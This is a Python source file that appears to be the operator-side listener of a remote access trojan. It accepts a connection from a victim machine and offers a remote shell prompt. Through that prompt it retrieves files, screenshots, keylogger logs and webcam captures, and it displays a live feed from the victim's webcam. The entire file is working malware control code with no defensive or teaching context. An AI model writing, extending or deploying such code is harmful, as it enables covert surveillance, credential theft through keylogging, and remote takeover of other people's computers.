import socket, os, time
import cv2, socket, numpy

ip_address = '192.168.69.12'

def webCam(connection, command):
    connection.send(command)
    while True:
        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip_address, 9900)) #bind on all interface to port 9900
        soc.listen(1) #listen for one connection
        conn, addr = soc.accept() #accept connection
        
        message = [] #variable to hold the data
        while True:
            d = conn.recv(1024 * 1024) #receive this much data
            if not d: break
            message.append(d)
        data = ''.join(message) #assemble the entire data
        numpy_data = numpy.fromstring(data, numpy.uint8) #convert to its original format
         
        decimg = cv2.imdecode(numpy_data, 1) #read image from memory buffer(numpy_data)
        cv2.imshow("Remote WebCam", decimg) #display image
         
        if cv2.waitKey(5) == 27: break #close if user presses 'ESC'
         
    cv2.destroyAllWindows()

def transfer(conn,command):
    conn.send(command)
    f = open('test.png','wb')
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed '
            f.close()
            break
        elif bits.endswith('captured'):
            print '[+] Transferring Screen Shot of Victim...'
            time.sleep(2)
            print '\n[+] Transfer completed '
            f.close()
            break
        elif bits.endswith('LogSent'):
            print '[+] Transferring KeyLog File...'
            time.sleep(2)
            print '\n[+] Transfer completed '
            f.close()
            break
        f.write(bits)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip_address, 8080))
    s.listen(1)
    print '[+] Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept()
    print '[+] We got a connection from: ', addr

    while True:       
        command = raw_input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close() 
            break
        elif 'grab' in command: 
            transfer(conn,command)
        elif 'screencap' in command:
            transfer(conn, command)
        elif 'getLogFile' in command:
             transfer(conn, command)
        elif 'getWebcam' in command:
             transfer(conn, command)
        elif 'activateWebcam' in command:
            webCam(conn, command)
        else:
            conn.send(command) 
            print conn.recv(1024 * 1024) 
        
def main ():
    connect()
main()











